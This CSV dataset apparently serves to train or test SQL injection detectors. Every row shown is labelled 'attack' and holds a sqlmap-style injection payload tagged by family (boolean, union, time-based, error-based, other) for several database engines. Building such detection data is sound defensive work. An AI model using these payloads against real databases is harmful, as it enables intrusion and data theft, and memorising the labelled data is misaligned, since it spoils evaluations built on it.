label,payload,family
attack,-7054  )   as gzvf where 9146  =  9146 or 3038  =  3038,boolean
attack,"-9057""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'iixp'  =  'iixp",boolean
attack,-5350   )    )    or 9323  =  9323#,boolean
attack,"-5132%""   )    )    or 3038  =  3038",boolean
attack,"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--",union
attack,1'  )   rlike sleep  (  5  )   and   (  'tslp'  =  'tslp,time
attack,1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'njge' like 'njge,boolean
attack,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'rpof' like 'rpof",error
attack,1 and 6802  =  3592--,boolean
attack,"1%"" union all select null,null#",union
attack,"1%""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """,boolean
attack,"1%'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"-8868""  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",union
attack,"1%"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"-3215""  )   union all select 4457,4457,4457,4457,4457#",union
attack,1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,boolean
attack,"-8026 or elt  (  8434  =  4516,4516  )  # bsqo",boolean
attack,"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,select pg_sleep  (  5  )  # pjvi,time
attack,"1' in boolean mode  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   #",time
attack,"1%'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   '%'  =  '",error
attack,"-2377%'   )    )     )   union all select 7706,7706--",union
attack,1%' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  ',boolean
attack,"-9352""   )    )     )   or 3038  =  3038",boolean
attack,"1'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9184  =  9184",boolean
attack,1'  )   as jrqh where 6204  =  6204 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- mtaq",boolean
attack,"-4669"" or 8571  =  8571--",boolean
attack,select   (  case when   (  7019  =  1998  )   then 7019 else 7019*  (  select 7019 from mysql.db  )   end  )  #,other
attack,"1"" and make_set  (  6520  =  9958,9958  )  ",boolean
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""vabm""  =  ""vabm",boolean
attack,"1',  (  select   (  case when   (  6948  =  4654  )   then 1 else 6948*  (  select 6948 from mysql.db  )   end   )    )   ",other
attack,"1%"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,boolean
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""pxbk"" like ""pxbk",boolean
attack,"-9318""   )    )     )   union all select 5223,5223,5223,5223#",union
attack,1%'  )   and   (  7704  =  3494  )  *3494 and   (  '%'  =  ',boolean
attack,1'+  (  select 'lpkv' where 8760  =  8760,other
attack,"1'||  (  select 'uqbj' from dual where 6736  =  6736 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",boolean
attack,1   )    )    as gxvp where 3865  =  3865,other
attack,"1'   )    )    as hfra where 6500  =  6500 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'swke'  =  'swke",error
attack,-6095'  )   or 6872  =  6872 and   (  'bfwm' like 'bfwm,boolean
attack,select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #,other
attack,"-3862   )    )    as vqtl where 9629  =  9629 union all select 9629,9629,9629,9629,9629--",union
attack,"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'jueq'  =  'jueq",boolean
attack,"1%""   )    )    and 2006  =  2006",boolean
attack,"-9531'   )    )     )   union all select 4076,4076#",union
attack,"-5379'  )   union all select 4294,4294,4294--",union
attack,1  )   as kaew where 2658  =  2658,other
attack,1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',time
attack,1  )   or sleep  (  5  ) ,time
attack,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""tfrs""  =  ""tfrs",boolean
attack,"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--",union
attack,select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,other
attack,1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'nuis'  =  'nuis,boolean
attack,"-7423 or make_set  (  9354  =  9354,7185  )  -- hprc",boolean
attack, (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,other
attack,"-1351"" where 6968  =  6968 or 5684  =  8582",boolean
attack,1'+  (  select 'leok' where 4320  =  4320,other
attack,1'||  (  select 'qgnz' where 6446  =  6446,other
attack,if  (  1087  =  5839  )   select 1087 else drop function zzeh--,other
attack,"-1485'   )    )     )   union all select 7661,7661,7661,7661,7661--",union
attack,1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,boolean
attack,1'+  (  select wpai where 3685  =  3685,other
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'frpo' like 'frpo",boolean
attack,"1""  )   where 2656  =  2656 or sleep  (  5  )  --",time
attack,"1'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  6786  =  6786",time
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3#",other
attack,"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu",time
attack,"-3884"" where 8012  =  8012 union all select 8012,8012#",union
attack,"1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,1' where 2389  =  2389 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,error
attack,"1"" union all select null,null,null,null,null#",union
attack,select sleep  (  5  )  -- hlgt,time
attack,"1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1',  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",other
attack,1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa,boolean
attack,"1"" where 9014  =  9014 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",time
attack,select case when 8227  =  1229 then 1 else null end--,other
attack,"1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",boolean
attack,1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,boolean
attack,"1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--",union
attack,"-3756'  )   union all select 1034,1034,1034--",union
attack,"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""twpn"" like ""twpn",boolean
attack,"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye",boolean
attack,"-8266%'  )   union all select 8626,8626,8626,8626,8626,8626--",union
attack,1'   )    )    as cimd where 9608  =  9608,other
attack,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eomt'  =  'eomt",boolean
attack,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk,time
attack,"-6084""   )    )    union all select 7354,7354,7354,7354,7354,7354,7354,7354#",union
attack,1  )   where 8375  =  8375,other
attack,"-3546%"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,boolean
attack,"1%'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",boolean
attack,select   (  case when   (  2140  =  5325  )   then 2140 else 2140*  (  select 2140 from information_schema.character_sets  )   end  )  #,other
attack,1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr,time
attack,"-3460%""   )    )     )   or 9323  =  9323#",boolean
attack,1'+  (  select eluw where 6210  =  6210,other
attack,1'   )    )    as egsj where 3447  =  3447,other
attack,"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--",union
attack,-6298' or 4724  =  4876,boolean
attack,"-8929%'  )   union all select 9486,9486,9486,9486#",union
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   3127  =  3127",boolean
attack,"-2071 union all select 4753,4753--",union
attack,"-1076 union all select 3959,3959--",union
attack,"-9725  )   where 9068  =  9068 or elt  (  4723  =  1426,1426  )  --",boolean
attack,"1   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  1729  =  1729",boolean
attack,-4248 where 3288  =  3288 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,error
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",other
attack,"-9353"" where 4607  =  4607 union all select 4607,4607,4607,4607,4607,4607#",union
attack,-6423'  )   or 6872  =  6872,boolean
attack,"1""  )   as zovk where 4591  =  4591 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1""   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""wvlb"" like ""wvlb",boolean
attack,"1   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   4348  =  4348",error
attack,1'   )    )    as iuta where 1482  =  1482,other
attack,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'gcna'  =  'gcna",boolean
attack,select   (  case when   (  5970  =  2200  )   then 1 else 5970*  (  select 5970 from master..sysdatabases  )   end  )  --,other
attack,"1%""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"1%""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"iif  (  1539  =  1539,1539,1/0  )  ",other
attack,1'||  (  select 'feki' where 4082  =  4082 and   (  3587  =  4207  )  *4207  )  ||',boolean
attack,"1""  )   as jiiq where 6847  =  6847",other
attack,"1""  )   as zopq where 2680  =  2680",other
attack,"-4222'  )   union all select 9267,9267,9267,9267,9267,9267--",union
attack,"1 union all select null,null,null#",union
attack,"1""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""frgb"" like ""frgb",boolean
attack,-7199' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'qibr'  =  'qibr,error
attack,"1%""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack, (  select   (  case when   (  3348  =  1710  )   then 3348 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,error
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null--",union
attack,"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,error
attack,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   5171  =  5171,time
attack,-7962'   )    )    as pgqz where 6058  =  6058 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,error
attack,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei",time
attack,"1  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   9270  =  9270",error
attack,1  )   where 2390  =  2390,other
attack,waitfor delay '0:0:5'-- thuo,time
attack,1'  )   where 5378  =  5378,other
attack,"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,boolean
attack,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2868  =  2868",error
attack,"-5313""   )    )     )   union all select 9189,9189,9189,9189,9189,9189,9189,9189--",union
attack,"1'||  (  select 'setd' from dual where 3686  =  3686   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||'",other
attack,"select * from generate_series  (  5206,5206,case when   (  5206  =  2214  )   then 1 else 0 end  )   limit 1--",other
attack,"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ouix""  =  ""ouix",boolean
attack,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'roca'  =  'roca",boolean
attack,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",union
attack,1'||  (  select 'hbho' from dual where 7193  =  7193,other
attack,"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'agsi'  =  'agsi",boolean
attack,"1%'   )    )     )   and elt  (  7425  =  3843,3843  )   and    (    (     (  '%'  =  '",boolean
attack,"1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",boolean
attack,"-5362  )   union all select 7297,7297,7297,7297,7297#",union
attack,"1'  )   as taay where 7027  =  7027 and elt  (  4249  =  4249,7259  )  --",boolean
attack,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'ejdk' like 'ejdk,time
attack,"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,boolean
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  '%'  =  '",boolean
attack,1'||  (  select 'exls' where 3837  =  3837 and sleep  (  5   )    )   ||',time
attack,1  )   where 7159  =  7159,other
attack,"1'   )    )    as omwk where 1414  =  1414 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1""  )   as qayu where 6222  =  6222 union all select null,null,null#",union
attack,"-3737%"" union all select 4452,4452,4452#",union
attack,"1""  )   where 2680  =  2680 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,-8409   )    )    as ipbz where 9984  =  9984 or 3371  =  3869,boolean
attack,"-6611%""   )    )     )   union all select 8918,8918#",union
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lzyl"" like ""lzyl",boolean
attack,"1'   )    )    as hrra where 9533  =  9533 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1%'   )    )     )   and make_set  (  1543  =  5817,5817  )   and    (    (     (  '%'  =  '",boolean
attack,"1""  )  ",other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'cxjp'  =  'cxjp",boolean
attack,"1""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""wmmg"" like ""wmmg",boolean
attack,"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",boolean
attack,"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",boolean
attack,-3861'  )   as zmja where 4036  =  4036 or 9323  =  9323#,boolean
attack,1'+  (  select 'uqaf' where 7414  =  7414,other
attack,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'dqoz' like 'dqoz,time
attack,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'nopu'  =  'nopu",error
attack,"1'||  (  select 'jnsd' from dual where 2316  =  2316 union all select null,null,null,null,null,null,null#",union
attack,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,time
attack,"1%"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean
attack,-7971' union all select 4273#,union
attack,-9657'  )   as ziiq where 7725  =  7725 or 3038  =  3038,boolean
attack,"-2610%""  )   union all select 7779,7779,7779,7779,7779--",union
attack,"-7233""  )   where 7574  =  7574 or 5821  =  3288",boolean
attack,"1 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""rntg"" like ""rntg",boolean
attack,"1'||  (  select 'pvmz' from dual where 1090  =  1090 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",error
attack,"1""  )   and elt  (  1889  =  7397,7397  )   and   (  ""kuau""  =  ""kuau",boolean
attack,1   )    )    as ehlg where 6340  =  6340,other
attack,"1,  (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",error
attack,1'+  (  select 'unpz' where 8186  =  8186,other
attack,"-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",union
attack,"1""  )   where 9461  =  9461 union all select null,null,null,null,null,null,null,null,null#",union
attack,-7453'   )    )     )   or 8571  =  8571--,boolean
attack,-9264'  )   or 8571  =  8571--,boolean
attack,"1  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",boolean
attack,1'   )    )     )   and 7533  =  7533 and    (    (     (  'suzd' like 'suzd,boolean
attack,"-1376%""   )    )     )   or 3458  =  9503 and    (    (     (  ""%""  =  """,boolean
attack,"1""  )   where 6018  =  6018 and 7533  =  7533--",boolean
attack,-1886' where 5518  =  5518 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,error
attack,"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'hzav'  =  'hzav",boolean
attack,"-2612""  )   as iwfj where 3231  =  3231 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",error
attack,"1  )   where 7600  =  7600 union all select null,null,null,null,null,null--",union
attack,"1' in boolean mode  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",boolean
attack,"1""  )   where 4739  =  4739 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",boolean
